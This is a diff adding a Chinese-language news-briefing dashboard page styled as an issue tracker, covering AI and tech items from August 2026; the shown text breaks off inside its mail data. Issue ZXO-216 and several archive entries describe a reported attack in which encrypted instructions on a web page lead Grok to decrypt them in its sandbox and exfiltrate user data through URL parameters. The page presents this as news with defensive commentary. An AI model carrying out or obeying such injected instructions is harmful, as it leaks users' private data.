@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>折晓 · 值班 · TODAY / 0821</title>
+<!--
+Design references actually used:
+- Linear product-as-page: https://plinthstudio.dev/blog/stripe-linear-loom-design-lessons
+- Linear homepage as living demo (issue + thread + agent output)
+Product name: 折晓 · 值班 / TODAY / 0821
+The first screen IS the working fake product. No splash. Product UI from the first pixel.
+-->
+<style>
+
+:root{
+  --bg:#f4f4f5;
+  --panel:#ffffff;
+  --ink:#18181b;
+  --ink2:#3f3f46;
+  --mute:#71717a;
+  --mute2:#a1a1aa;
+  --line:#e4e4e7;
+  --line2:#d4d4d8;
+  --sel:#f4f4f5;
+  --sel2:#eeeef0;
+  --hover:#fafafa;
+  --urgent:#c2410c;
+  --blocked:#b91c1c;
+  --shipped:#3f6212;
+  --review:#1d4ed8;
+  --high:#a16207;
+  --med:#52525b;
+  --low:#a1a1aa;
+  --chip:#f4f4f5;
+  --term:#18181b;
+  --termink:#e4e4e7;
+  --warn:#fb923c;
+  --ok:#86efac;
+  --danger:#fca5a5;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;background:var(--bg);color:var(--ink);
+  font-family:Inter,ui-sans-serif,system-ui,-apple-system,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+  font-size:13px;line-height:1.45;letter-spacing:-0.011em;
+  overflow:hidden;-webkit-font-smoothing:antialiased}
+button,input{font:inherit;color:inherit}
+button{border:0;background:none;cursor:pointer}
+a{color:inherit}
+.mono{font-family:ui-monospace,"SF Mono",Menlo,Consolas,"Liberation Mono",monospace;letter-spacing:0}
+.app{display:flex;flex-direction:column;height:100%}
+
+/* top bar */
+.top{height:44px;min-height:44px;display:flex;align-items:center;gap:10px;
+  padding:0 14px;background:var(--panel);border-bottom:1px solid var(--line);z-index:5}
+.brand{display:flex;align-items:baseline;gap:8px;flex-shrink:0}
+.brand .mark{font-weight:560;letter-spacing:-0.03em;font-size:14px}
+.brand .sep{color:var(--mute2)}
+.brand .meta{color:var(--mute);font-size:12px}
+.top .sp{flex:1}
+.chip{display:inline-flex;align-items:center;gap:6px;height:26px;padding:0 9px;
+  border:1px solid var(--line);border-radius:6px;background:var(--panel);color:var(--ink2);
+  font-size:12px}
+.chip:hover{background:var(--sel);border-color:var(--line2)}
+.chip b{font-weight:560;letter-spacing:-0.03em}
+.chip .dot{width:6px;height:6px;border-radius:50%;background:var(--ink)}
+.chip.num b{font-variant-numeric:tabular-nums}
+.kbd{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:10px;
+  border:1px solid var(--line);border-radius:4px;padding:1px 5px;color:var(--mute);background:var(--chip)}
+
+/* body */
+.body{flex:1;display:grid;grid-template-columns:272px 1fr 340px;min-height:0}
+.side,.main,.agent{min-height:0;overflow:hidden}
+.side{background:var(--panel);border-right:1px solid var(--line);display:flex;flex-direction:column}
+.side-h{padding:12px 12px 8px;display:flex;align-items:center;justify-content:space-between}
+.side-h h2{font-size:11px;font-weight:550;letter-spacing:.08em;text-transform:uppercase;color:var(--mute)}
+.filters{display:flex;gap:2px;padding:0 8px 8px}
+.filters button{padding:4px 8px;border-radius:5px;color:var(--mute);font-size:12px}
+.filters button.on{background:var(--sel);color:var(--ink);font-weight:550}
+.ilist{flex:1;overflow:auto;padding:0 6px 96px}
+.iss{width:100%;text-align:left;padding:8px 8px 8px 10px;border-radius:7px;display:grid;
+  grid-template-columns:auto 1fr;gap:2px 8px;margin-bottom:1px;position:relative}
+.iss:hover{background:var(--hover)}
+.iss.on{background:var(--sel2)}
+.iss.on::before{content:"";position:absolute;left:0;top:8px;bottom:8px;width:2px;background:var(--ink);border-radius:1px}
+.iss .id{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:10.5px;color:var(--mute);grid-column:1}
+.iss .st{grid-column:2;font-size:10.5px;color:var(--mute);display:flex;gap:6px;align-items:center}
+.iss .tt{grid-column:1/-1;font-size:12.5px;color:var(--ink);line-height:1.35;
+  display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+.pri{font-size:10px;letter-spacing:.02em}
+.pri.Urgent{color:var(--urgent)} .pri.High{color:var(--high)}
+.pri.Medium{color:var(--med)} .pri.Low{color:var(--low)}
+.stt{display:inline-flex;align-items:center;gap:4px}
+.stt i{width:6px;height:6px;border-radius:50%;background:var(--mute2)}
+.stt.InReview i{background:var(--review)}
+.stt.Blocked i{background:var(--blocked)}
+.stt.Shipped i{background:var(--shipped)}
+.hint{padding:8px 12px;font-size:11px;color:var(--mute2);border-top:1px solid var(--line)}
+.hint .kbd{margin:0 2px}
+
+/* main */
+.main{background:var(--bg);overflow:auto;padding:28px 36px 80px}
+.crumb{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--mute);margin-bottom:14px}
+.crumb .id{font-family:ui-monospace,Menlo,Consolas,monospace;color:var(--ink2)}
+.props{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:16px}
+.pill{display:inline-flex;align-items:center;gap:5px;height:22px;padding:0 8px;
+  border:1px solid var(--line);border-radius:999px;background:var(--panel);font-size:11px;color:var(--ink2)}
+.pill i{width:6px;height:6px;border-radius:50%}
+h1.title{font-size:22px;font-weight:560;letter-spacing:-0.03em;line-height:1.3;margin:0 0 16px;max-width:40rem}
+.lead,.why{max-width:40rem;font-size:14px;line-height:1.65;color:var(--ink2)}
+.lead{margin-bottom:12px}
+.why{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:10px 12px;margin:16px 0 20px}
+.why em{font-style:normal;font-weight:550;color:var(--ink);margin-right:6px}
+.atts{display:flex;flex-direction:column;gap:4px;margin:8px 0 28px;max-width:40rem}
+.att{display:flex;align-items:center;gap:8px;padding:7px 10px;border:1px solid var(--line);
+  border-radius:7px;background:var(--panel);text-decoration:none;color:var(--ink2)}
+.att:hover{border-color:var(--line2);background:var(--hover)}
+.att .ic{width:22px;height:22px;border:1px solid var(--line);border-radius:4px;
+  display:grid;place-items:center;font-size:10px;color:var(--mute);font-family:ui-monospace,Menlo,Consolas,monospace}
+.att .nm{flex:1}
+.att .go{color:var(--mute2);font-size:11px}
+
+.sec{font-size:11px;font-weight:550;letter-spacing:.08em;text-transform:uppercase;color:var(--mute);margin:8px 0 10px}
+.thread{max-width:40rem;display:flex;flex-direction:column}
+.cm{display:grid;grid-template-columns:28px 1fr;gap:8px;padding:10px 0;border-top:1px solid var(--line)}
+.av{width:22px;height:22px;border-radius:50%;background:var(--sel2);border:1px solid var(--line);
+  display:grid;place-items:center;font-size:10px;color:var(--mute);margin-top:2px}
+.cm .who{font-weight:550;font-size:12.5px}
+.cm .tm{color:var(--mute);font-size:11px;margin-left:6px;font-family:ui-monospace,Menlo,Consolas,monospace}
+.cm p{margin-top:3px;color:var(--ink2);font-size:13px;line-height:1.6}
+
+/* agent */
+.agent{background:var(--panel);border-left:1px solid var(--line);display:flex;flex-direction:column}
+.agent-h{padding:10px 12px 8px;border-bottom:1px solid var(--line);display:flex;align-items:center;justify-content:space-between}
+.agent-h h2{font-size:11px;font-weight:550;letter-spacing:.08em;text-transform:uppercase;color:var(--mute)}
+.atabs{display:flex;gap:4px;padding:8px}
+.atabs button{flex:1;padding:6px 8px;border:1px solid var(--line);border-radius:6px;font-size:11.5px;color:var(--mute);text-align:left}
+.atabs button.on{background:var(--ink);color:#fff;border-color:var(--ink)}
+.atabs button small{display:block;font-size:10px;opacity:.65;margin-top:1px}
+.term{flex:1;overflow:auto;margin:0 8px 8px;background:var(--term);color:var(--termink);
+  border-radius:8px;padding:12px 12px 16px;font-family:ui-monospace,Menlo,Consolas,monospace;
+  font-size:11.5px;line-height:1.55}
+.term .ln{white-space:pre-wrap;word-break:break-word;margin:0 0 2px}
+.term .role{color:#a1a1aa}
+.term .user{color:#93c5fd}
+.term .tool{color:#fde68a}
+.term .out{color:#d4d4d8}
+.term .danger{color:var(--danger)}
+.term .ok{color:var(--ok)}
+.term .warn{color:var(--warn)}
+.term .dim{color:#71717a}
+.term .hr{border:none;border-top:1px solid #27272a;margin:8px 0}
+.term .flag{display:inline-block;border:1px solid #7f1d1d;color:var(--danger);
+  padding:0 5px;border-radius:3px;font-size:10px;margin-left:6px}
+
+/* note chip */
+.note{position:fixed;left:12px;bottom:12px;z-index:8;width:248px;text-align:left;
+  background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:8px 10px 8px 12px;
+  box-shadow:0 8px 24px rgba(24,24,27,.06);border-left:2px solid var(--urgent)}
+.note:hover{border-color:var(--line2);border-left-color:var(--urgent)}
+.note .row{display:flex;align-items:center;gap:6px;font-size:11px;color:var(--urgent);font-weight:550}
+.note .ttl{margin-top:2px;font-size:12.5px;color:var(--ink)}
+.note .sub{font-size:11px;color:var(--mute);margin-top:1px}
+
+/* overlays */
+.ov{position:fixed;inset:0;background:rgba(24,24,27,.28);display:none;z-index:20;align-items:flex-start;justify-content:center;padding:10vh 16px 16px}
+.ov.show{display:flex}
+.pal{width:min(720px,100%);background:var(--panel);border:1px solid var(--line);border-radius:10px;
+  box-shadow:0 24px 64px rgba(24,24,27,.18);overflow:hidden;max-height:72vh;display:flex;flex-direction:column}
+.pal input{width:100%;border:0;border-bottom:1px solid var(--line);padding:12px 14px;outline:none;background:transparent;font-size:14px}
+.pal .rows{overflow:auto}
+.prow{display:grid;grid-template-columns:92px 64px 1fr;gap:8px;padding:9px 14px;border-bottom:1px solid var(--line);text-decoration:none;color:inherit}
+.prow:hover,.prow.on{background:var(--sel)}
+.prow .t{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:10.5px;color:var(--mute)}
+.prow .id{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:10.5px;color:var(--ink2)}
+.prow .f{font-size:12.5px;line-height:1.4}
+.prow .w{font-size:11px;color:var(--mute);margin-top:2px}
+
+.sheet{width:min(820px,100%);background:var(--panel);border:1px solid var(--line);border-radius:10px;
+  box-shadow:0 24px 64px rgba(24,24,27,.18);max-height:84vh;overflow:auto;padding:28px 36px 40px}
+.sheet h2{font-size:22px;font-weight:560;letter-spacing:-0.03em;margin:8px 0 16px}
+.sheet .k{font-size:11px;letter-spacing:.08em;text-transform:uppercase;color:var(--mute)}
+.sheet p{font-size:15px;line-height:1.8;color:var(--ink2);margin:0 0 14px;max-width:40rem}
+.sheet .foot{margin-top:28px;font-size:11px;color:var(--mute2)}
+.close{float:right;border:1px solid var(--line);border-radius:6px;padding:4px 8px;font-size:12px;color:var(--mute)}
+.close:hover{background:var(--sel)}
+
+.wo{border:1px solid var(--line);border-radius:8px;padding:12px 14px;margin:0 0 8px;background:var(--bg)}
+.wo .hd{display:flex;align-items:center;gap:8px;margin-bottom:6px}
+.wo b{font-weight:550}
+.wo .act{margin-top:8px;font-size:12.5px;color:var(--ink2)}
+.wo a{color:var(--review)}
+
+.footbar{position:fixed;right:16px;bottom:10px;z-index:4;font-size:10.5px;color:var(--mute2);
+  font-family:ui-monospace,Menlo,Consolas,monospace;pointer-events:none}
+
+@media (max-width:1100px){
+  .body{grid-template-columns:240px 1fr}
+  .agent{display:none}
+  .agent.open-m{display:flex;position:fixed;inset:44px 0 0 auto;width:min(360px,100%);z-index:6;border-left:1px solid var(--line)}
+}
+@media (max-width:760px){
+  .body{grid-template-columns:1fr}
+  .side{display:none}
+  .side.open-m{display:flex;position:fixed;inset:44px auto 0 0;width:min(300px,88%);z-index:6}
+  .main{padding:20px 16px 96px}
+  .note{width:auto;right:12px}
+}
+
+</style>
+</head>
+<body>
+<div class="app">
+  <header class="top">
+    <div class="brand">
+      <span class="mark">折晓 早报</span>
+      <span class="sep">·</span>
+      <span class="meta">2026-08-21 · 北京</span>
+    </div>
+    <span class="sp"></span>
+    <button type="button" class="chip" id="btnPulse" title="Project update">Pulse <b>周报</b></button>
+    <button type="button" class="chip num" id="btnNum" title="今日数字"><span class="dot"></span> Today <b>45%</b></button>
+    <button type="button" class="chip" id="btnPal"><span class="kbd">/</span> Backlog</button>
+  </header>
+  <div class="body">
+    <aside class="side">
+      <div class="side-h"><h2>Issues</h2><span class="mono" style="font-size:11px;color:var(--mute)">TODAY / 0821</span></div>
+      <div class="filters">
+        <button type="button" class="on" data-f="active">Active 7</button>
+        <button type="button" data-f="backlog">Backlog</button>
+      </div>
+      <div class="ilist" id="ilist"></div>
+      <div class="hint"><span class="kbd">j</span><span class="kbd">k</span> 移动 <span class="kbd">↵</span> 打开 <span class="kbd">/</span> 档案</div>
+    </aside>
+    <main class="main" id="main"></main>
+    <aside class="agent">
+      <div class="agent-h">
+        <h2>Agent run</h2>
+        <span class="mono" style="font-size:10.5px;color:var(--mute)">Slack Code · Qwen-UI · Grok CCI</span>
+      </div>
+      <div class="atabs">
+        <button type="button" class="on" data-run="grok">grok-cci-review<small>dangerous tool call</small></button>
+        <button type="button" data-run="qwen">qwen-ui-phone<small>real device taps</small></button>
+      </div>
+      <div class="term" id="term"></div>
+    </aside>
+  </div>
+</div>
+
+<button type="button" class="note" id="note">
+  <div class="row">DUE  08-23 07:59 · Urgent</div>
+  <div class="ttl">ZXO-221 · Manus 羽升删除</div>
+  <div class="sub">备份 Task 数据，不要压到后天</div>
+</button>
+<div class="footbar">2026-08-21 北京时间 · 折晓 早报</div>
+
+<div class="ov" id="ovPal"><div class="pal" onclick="event.stopPropagation()">
+  <input id="palQ" placeholder="检索 24h 档案 · 时间 / 事实 / 来源" autocomplete="off" spellcheck="false">
+  <div class="rows" id="palRows"></div>
+</div></div>
+<div class="ov" id="ovPulse"><div class="sheet" id="pulseInner" onclick="event.stopPropagation()"></div></div>
+<div class="ov" id="ovMail"><div class="sheet" id="mailInner" onclick="event.stopPropagation()"></div></div>
+
+<script>
+
+const ISSUES = [{"id": "ZXO-214", "status": "In Review", "pri": "Urgent", "cycle": "0821", "label": "阿里云 · 官方", "title": "阿里 FY27 Q1：AI 云 48,437m +45%，实验室段亏 13,861m", "body": "阿里巴巴公布截至 2026-06-30 的 FY27 Q1：AI 云与算力营收人民币 48,437 million，同比 +45%；AI 相关产品 12,376 million，连续第十二个季度三位数增长。云经调整 EBITA +133% 至 5,628 million；实验室与应用段经调整 EBITA 亏损 13,861 million；资本开支 67,678 million，+75%。", "why": "今日数字的出处。同一份报表里云在赚钱、实验室在烧；报道称电话会 ARR 495 亿是年化口径，不要写成已经入账的季报。", "agent": null, "atts": [["阿里巴巴官方新闻稿", "https://www.alibabagroup.com/en-US/document-2026456290057781248"], ["新闻稿转载 · 分段与资本开支", "https://www.innovationopenlab.com/news-biz/71356/alibaba-group-announces-june-quarter-2026-results.html"], ["报道称 ARR 495 亿 · 电话会", "https://www.fx168news.com/article/1079009"]], "thread": [["值班", "08:12", "本季起四段披露：电商集团、AI 云与算力、AI 实验室与应用、其他。云智能与平头哥并入云与算力；模型实验室、千问消费、千问办公从「其他」并入实验室与应用。"], ["核稿", "08:18", "集团营收 2,689.53 亿，+9%。经调整 EBITA 273.29 亿，−30%。不要用旧「云智能」口径对这一季。"], ["来源", "08:21", "报道称吴泳铭：AI 相关产品 ARR 突破 495 亿元、占云外部收入 35%；含 MaaS 的模型与应用服务 ARR 突破 160 亿。年化标报道称。"], ["附注", "09:02", "资本开支 +75% 到 67,678 million，是烧的那一侧，不是云段在亏。"]]}, {"id": "ZXO-215", "status": "Shipped", "pri": "High", "cycle": "0821", "label": "千问 · 厂商基准", "title": "Qwen-UI-Agent：真机跨端，GUI 与 CLI 一次决策成批出动作", "body": "IT之家 8 月 20 日 17:45：阿里巴巴推出以真实世界为中心的 GUI 智能体基座 Qwen-UI-Agent，覆盖移动、电脑、网页与 DeepSearch。统一动作空间把 GUI 与 CLI 编在一次决策里；厂商称电脑任务里 CLI 占比近半，约 40% 动作成批发出。", "why": "真机已经在点，不是演示稿。厂商基准不是第三方裁判；危险请求不执行，支付与删除先停手。", "agent": "qwen", "atts": [["IT之家 · 发布稿", "https://www.ithome.com/0/992/239.htm"], ["arXiv:2607.28227 技术报告", "https://arxiv.org/abs/2607.28227"]], "thread": [["值班", "17:48", "厂商基准：MobileWorld 82.1%，分别领先 GPT-5.6 Sol、Claude Opus 4.8、Seed 2.1 Pro 12.0 / 14.6 / 8.9 个百分点。标厂商基准。"], ["核稿", "17:51", "真机 MobileWorld-Real 92.2%；Android Daily 97.5%。电脑端 OSWorld-Verified 79.5%，OSWorld-v2 Partial 40.0%，并称较基线少 58% 步数。"], ["来源", "17:55", "浏览器 WebArena 73.6%，BrowseComp-ZH 75.0%，ScreenSpot-Pro 81.5%。真机环境：100+ 部手机、150+ 应用，自建 400+ 任务真机基准。"], ["附注", "18:10", "在线 RL 超 100 步，约 1 万并发环境。技术报告 arXiv:2607.28227。这是厂商自己的桌子。"]]}, {"id": "ZXO-216", "status": "Blocked", "pri": "Urgent", "cycle": "0821", "label": "Grok · 仍活", "title": "Adversa CCI：Grok 沙箱解密后把对话写进网址参数", "body": "Adversa 披露 Cryptographic Context Injection：指令封进 AES-256-GCM，密钥和 PBKDF2 参数就在网页上；用户只说「总结这一页」。Grok 在代码沙箱里解密，把沙箱输出当成内部状态，再把姓名、粗略位置、订阅档和整段对话塞进网址参数，用导航工具外带。", "why": "6 月 3 日报 xAI，8 月 19 日仍能复现。护栏分类文本，代理人跑程序。修复不在再加一层只读分类器。", "agent": "grok", "atts": [["Adversa 研究主文", "https://adversa.ai/blog/cryptographic-context-injection-grok-data-theft/"], ["The Register · 8 月 20 日", "https://www.theregister.com/ai-and-ml/2026/08/20/grok-chat-duped-into-swallowing-injected-instructions/5290019"], ["Ars Technica", "https://arstechnica.com/security/2026/08/grok-exfiltrates-user-data-when-malicious-instructions-are-encrypted/"]], "thread": [["值班", "08:40", "演示为零点击，无确认、无警告。6 月 3 日直接并经 HackerOne 报给 xAI，8 月 4 日、10 日跟进，8 月 19 日仍能复现。"], ["核稿", "08:44", "Ars：同一条明文指令会被拒；加密后由沙箱吐出即被执行。假「解密密钥」实为用户上下文，再写入攻击者 URL。"], ["来源", "08:50", "Gemini 上同一条链走不通外连（Python 不能访问外网），入夏后成功率下降。谷歌未被告知，因其漏洞计划不收越狱。"], ["附注", "09:15", "给工具输出打来源，对派生自抓取或解密内容的外连设闸。分类器读的是字，沙箱跑的是程序。"]]}, {"id": "ZXO-217", "status": "In Review", "pri": "Medium", "cycle": "0821", "label": "宇树 · day-2", "title": "王兴兴：ChatGPT 时刻 2–3 年或 5–10 年；卡住的是最后几毫米", "body": "CNBC 记：宇树创始人王兴兴在世界机器人大会第二天说，真正的突破是把机器人放进陌生的家、单靠文本或语音完成大约 80% 的任务；快则两到三年，慢则五到十年。他说规划走得动，最后几厘米或几毫米走不稳；公司在做「自进化开发环」。", "why": "day-2 讲话，不是挂牌日新铅。股票当日收 687，−18.7%（LSEG）。不要把昨天的挂牌故事再写成今天的主铅。", "agent": null, "atts": [["CNBC · 王兴兴讲话 / 687 −18.7%", "https://www.cnbc.com/2026/08/20/unitree-humanoid-robots-chatgpt-moment.html"]], "thread": [["值班", "20:10", "比他去年在同一场合「不到五年」更谨慎。机器仍比人低效，每个新任务都要从头训。"], ["核稿", "20:14", "LSEG：股票当日收到 687 元，跌近 19%。不当新上市故事。"], ["来源", "20:22", "摩根士丹利称 2026 年上半年全球人形出货约 1.9 万台、同比 +272%，中国厂商占 97%——投行估计，不是公告。"], ["附注", "20:30", "野村周三给买入、目标价 370 元，是卖方覆盖，不是成交事实。"]]}, {"id": "ZXO-218", "status": "Shipped", "pri": "High", "cycle": "0821", "label": "Slack · GA", "title": "Slack Code 对所有套餐开放：编码代理人进频道，批准之后才发出", "body": "The Verge 8 月 20 日 12:00 UTC（北京 20:00）：Slack 推出协作式编程频道 Slack Code。点名 Claude 或 Devin 一类编码代理人，代理人拉起一条代码频道：对话全员可见，可核对 diff、预览 HTML，批准之后才发出去。", "why": "把代理人放进批准频道，不是再做一个只分类文本的护栏。不要写成「Slack 自己会写代码」。", "agent": null, "atts": [["The Verge · Slack Code", "https://www.theverge.com/tech/982628/slack-code-vibe-coding-channels-launch"]], "thread": [["值班", "20:02", "即日起对任何 Slack 套餐开放，对接市场上架的代理人。任务完成后频道自动归档，并留审计日志。"], ["核稿", "20:06", "创始合作方包括 Claude Code、Devin、Vercel Agent、GitHub Copilot。"], ["附注", "20:11", "和 ZXO-216 对照：一边是工具输出未打来源，一边是 diff 必须人批。"]]}, {"id": "ZXO-219", "status": "In Review", "pri": "Medium", "cycle": "0821", "label": "北京人形 · 报道称", "title": "北京人形发布 Pelican-VL 2.0 与天工 Omni（厂商测评）", "body": "新华财经 8 月 20 日：北京人形机器人创新中心发布具身大脑 Pelican-VL 2.0，称从模块化走向端到端，在同一扩散解码里联合输出未来视频与底层动作；硬件端是天工 Omni，分旗舰、标准、基础三档。", "why": "厂商与报道用语称具身评测「大幅领先 GPT-5.5」。标报道称。不要把厂商测评写成第三方盲测。", "agent": null, "atts": [["新华财经 / 中经社", "https://www.cnfin.com/gs-lb/detail/20260820/4458066_1.html"]], "thread": [["值班", "16:40", "软件端三重统一：理解、推理、生成。硬件端开放全身运动控制、灵巧操作与多模态接口。"], ["核稿", "16:48", "测评数据：Pelican-VL 2.0 具身业务评测「大幅领先 GPT-5.5」，通用 Agent 能力「达到或超越国内头部商用大模型」——报道称 / 厂商用语。"], ["来源", "16:52", "CTO 唐剑：具身智能正从技术验证转向规模化应用。本体附录，不当主铅。"]]}, {"id": "ZXO-220", "status": "In Review", "pri": "Low", "cycle": "0821", "label": "台积电 · 报道称", "title": "报道称台积电 A16 已验证，今年第四季量产，晶背供电", "body": "东森财经 8 月 20 日 16:03 转《电子时报》：报道称台积电已开发并验证 A16，导入超级供电轨（SPR）晶背供电，称是业界首个采用该技术的埃米级 CMOS 平台。报道称 A16 预计今年第四季进入量产。", "why": "电子时报 / 东森转述，不是台积电本窗新闻稿。不要写成「已经量产」，也不要把工艺节点写成今天的主铅。", "agent": null, "atts": [["东森财经 · 转电子时报", "https://fnc.ebc.net.tw/fncnews/headline/216736"]], "thread": [["值班", "16:08", "供电网络移到背面，经垂直背面接点送到源极与漏极。"], ["核稿", "16:12", "报道称相对 N2P，同功耗可加速 8%–10%，同速度可降耗 15%–20%，密度升 8%–10%；并称尽量保留 N2P 的栅极密度与 NanoFlex。"], ["附注", "16:20", "前端改动小于英特尔 PowerVia——仍是转述。标报道称。"]]}];
+const ARCHIVE = [["08-20 官方", "ZXO-301", "阿里 FY27 Q1：AI 云与算力 484.37 亿 +45%；AI 产品 123.76 亿，连续 12 季三位数；云经调整 EBITA +133% 至 56.28 亿；实验室与应用经调整 EBITA 亏 138.61 亿；资本开支 676.78 亿 +75%。", "今日数字的出处。官方新闻稿。", "https://www.alibabagroup.com/en-US/document-2026456290057781248", "阿里巴巴 IR"], ["08-20 官方分段", "ZXO-302", "本季起四段：电商集团、AI 云与算力（云智能+平头哥）、AI 实验室与应用（模型实验室+千问消费+千问办公）、其他。集团营收 2,689.53 亿 +9%，经调整 EBITA 273.29 亿 −30%。", "分段是官方重切，不要用旧「云智能」口径。", "https://www.innovationopenlab.com/news-biz/71356/alibaba-group-announces-june-quarter-2026-results.html", "新闻稿转载"], ["08-20 报道称 电话会", "ZXO-303", "报道称吴泳铭：AI 相关产品 ARR 突破 495 亿元、占云外部收入 35%；含 MaaS 的模型与应用服务 ARR 突破 160 亿；云外部 +45% 为 22 季新高。", "年化是电话会口径，标报道称，不写进季报已入账。", "https://www.fx168news.com/article/1079009", "FX168 / 证券之星"], ["08-20 17:45", "ZXO-304", "Qwen-UI-Agent 发布：真机 100+ 手机 / 150+ 应用；厂商基准 MobileWorld 82.1%、真机 92.2%、Android Daily 97.5%、OSWorld-Verified 79.5%；GUI+CLI，约 40% 成批动作。", "厂商基准，不是第三方裁判。", "https://www.ithome.com/0/992/239.htm", "IT之家"], ["技术报告", "ZXO-305", "Qwen-UI-Agent Technical Report，arXiv:2607.28227。真实世界中心 GUI 基座；在线 RL 超 100 步，约 1 万并发环境。", "论文入口，与发布稿对照。", "https://arxiv.org/abs/2607.28227", "arXiv"], ["08-20 Adversa", "ZXO-306", "Cryptographic Context Injection：AES-256-GCM + 沙箱解密；Grok 零点击外带姓名/位置/档位/对话。6 月 3 日报 xAI，8 月 19 日仍活。", "护栏分类文本，代理人跑程序。", "https://adversa.ai/blog/cryptographic-context-injection-grok-data-theft/", "Adversa"], ["08-20 Register", "ZXO-307", "The Register：Grok 被诱吞下注入指令；加密帮助恶意指令过关；SpaceX/xAI 未回应置评。", "主流跟进。", "https://www.theregister.com/ai-and-ml/2026/08/20/grok-chat-duped-into-swallowing-injected-instructions/5290019", "The Register"], ["08-20 Ars", "ZXO-308", "Ars Technica：同一明文指令会被拒，加密后由沙箱吐出即被执行；假「解密密钥」实为用户上下文，再写入攻击者 URL。", "机制对照，不写利用步骤。", "https://arstechnica.com/security/2026/08/grok-exfiltrates-user-data-when-malicious-instructions-are-encrypted/", "Ars Technica"], ["08-20 大会第二天", "ZXO-309", "王兴兴：ChatGPT 时刻 2–3 年或 5–10 年；最后几毫米；自进化开发环。股票收 687，−18.7%（LSEG）。", "day-2，不是挂牌日新铅。", "https://www.cnbc.com/2026/08/20/unitree-humanoid-robots-chatgpt-moment.html", "CNBC"], ["08-20 北京人形", "ZXO-310", "北京人形发布 Pelican-VL 2.0 + 天工 Omni。测评称具身评测大幅领先 GPT-5.5，通用 Agent 达国内头部。厂商/报道用语，标报道称。", "本体附录，不当主铅。", "https://www.cnfin.com/gs-lb/detail/20260820/4458066_1.html", "新华财经"], ["08-20 12:00 UTC", "ZXO-311", "Slack Code 对所有套餐 GA：代码频道、diff、HTML 预览、批准后发出；Claude Code / Devin / Vercel Agent / Copilot。", "代理人进批准频道。", "https://www.theverge.com/tech/982628/slack-code-vibe-coding-channels-launch", "The Verge"], ["08-20 Verge", "ZXO-312", "《It's Greg Brockman's OpenAI now》：头衔仍是总裁，产品和 scaling 接到他手里；Simo 离职后安排坐实。", "人事边缘，不是产品发布。", "https://www.theverge.com/ai-artificial-intelligence/982774/greg-brockman-openai-role-expansion", "The Verge"], ["08-19 全员会 报道称", "ZXO-313", "报道称 CFO Friar 对员工说 2027 年成为上市公司，业务继续加速也可能更早；3 月融资、6 月保密申报；称 Anthropic 或 9 月揭文件「没关系」。知情人士转述。", "IPO 时间表，标报道称。", "https://www.cnbc.com/2026/08/19/open-ai-ipo-timing-2027-friar.html", "CNBC"], ["08-20 报道称", "ZXO-314", "报道称台积电 A16 已验证，导入 SPR 晶背供电，Q4 2026 量产；相对 N2P 同功耗 +8–10% 速度。电子时报/东森转述。", "工艺边缘，标报道称。", "https://fnc.ebc.net.tw/fncnews/headline/216736", "东森 / 电子时报"], ["邮件 报道称 · 08-24", "ZXO-315", "报道称 Cursor Auto 8 月 24 日从按次一口价改为按所路由模型计价，多数请求单价上升，包含用量上调。无博客、无 changelog，来自订阅邮件。昨日已记，不当新铅。", "计价变更，标报道称。", "https://blog.kilo.ai/p/all-roads-lead-to-metered-pricing", "订阅邮件转述"], ["近窗 08-19", "ZXO-316", "Grok 4.6 在 Amazon Bedrock 正式可调用：50 万上下文，low/medium/high/xhigh；输入 $2 / 百万、输出 $6 / 百万。Grok Build 为既有环境，非本窗新发布。", "近窗分发，不当新模型发布。", "https://x.ai/news/grok-4-6-amazon-bedrock", "xAI / AWS"], ["近窗 08-19/20", "ZXO-317", "Ornith-1.5 开源权重：397B / 35B-A3B / 9B，自称从自搭脚手架走到自改进。厂商数字：397B Terminal-Bench 2.1 为 86.1。无官方托管 API。", "开源附录，厂商数字。", "https://ornith.ai/ornith_1_5.html", "Ornith"], ["08-19 报道称", "ZXO-318", "报道称英伟达在北欧给 GPU 客户和机房运营商做牵线；CFO 6 月承认做过 matchmaking。Nebius、微软等已在区内签约。知情人士。", "算力地理，标报道称。", "https://www.cnbc.com/2026/08/19/nvidia-nordic-ai-data-centers.html", "CNBC"], ["窗口内 HF / 预印本", "ZXO-319", "拥抱脸与预印本流转 GUI 论文：Qwen-UI-Agent 2607.28227；腾讯 UI-Mate-27B / arXiv 2608.15930，称 OSWorld 等电脑使用基准。不当新发布会。", "论文抽屉，不当头条。", "https://arxiv.org/abs/2608.15930", "HF / arXiv"]];
+const MAIL = [{"id": "ZXO-221", "tag": "Urgent", "due": "08-23 07:59", "who": "Manus", "acct": "aimfllyys", "t": "08-21 03:33", "title": "账号「羽升」将于 08-23 08:00–08-25 07:59 删除", "body": "新加坡/北京时间 2026-08-23 08:00 至 08-25 07:59 删除账号羽升。须保存随附的账号数据文件；任务数据须另行在 2026-08-23 07:59 前备份；08-25 08:00 起可恢复。", "act": "立刻下载账号数据附件；今晚零点前另外备份 Task 数据。这是急件，不要压到后天。"}, {"id": "ZXO-222", "tag": "High", "due": "今天", "who": "GitHub Actions", "acct": "aimfllyys", "t": "08-21 03:00", "title": "SCI-AIChat-Demo ci · master 再次失败", "body": "master 上 CI 又红了。同一条流水线昨天也失败过。", "act": "打开这次 run 看日志并修，不要只重跑。", "href": "https://github.com/AIMFllyYS/SCI-AIChat-Demo/actions/runs/32406163710"}, {"id": "ZXO-223", "tag": "FYI", "due": "—", "who": "Z.ai", "acct": "aimfllyys", "t": "窗口内", "title": "GLM-5.3 API 已上线，价格同上一代", "body": "邮件称智谱 GLM-5.3 接口可用，定价跟上一代。昨日已有报道称接口上线，这封是账号侧确认。", "act": "若要用，到控制台核配额；不必回信。"}, {"id": "ZXO-224", "tag": "FYI", "due": "—", "who": "Cursor", "acct": "aimfllyys", "t": "窗口内", "title": "Origin 代码托管早鸟测试邮件", "body": "Cursor Origin 